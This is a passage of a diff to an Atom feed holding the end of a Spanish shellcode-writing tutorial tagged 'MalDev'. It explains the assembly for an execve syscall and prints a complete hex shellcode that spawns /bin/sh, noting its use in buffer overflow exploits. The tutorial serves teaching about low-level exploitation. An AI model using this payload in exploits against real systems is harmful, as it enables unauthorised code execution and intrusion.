+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Copiamos la direccion del &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; en &lt;code class=&quot;highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;xor rax, rax&lt;/code&gt; Lo mismo que el primer &lt;code class=&quot;highlighter-rouge&quot;&gt;xor&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mov al, 0x3b&lt;/code&gt; Copiamos el valor 0x3b que representa el numero de la syscall, al registro &lt;code class=&quot;highlighter-rouge&quot;&gt;al&lt;/code&gt; que funciona como un byte inferior de &lt;code class=&quot;highlighter-rouge&quot;&gt;rax&lt;/code&gt;, y por ultimo se ejecuta la syscall&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y si ejecutamos, nos da una shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y listo, tenemos otra shellcode:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.&lt;/p&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary>Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh</summary></entry></feed>
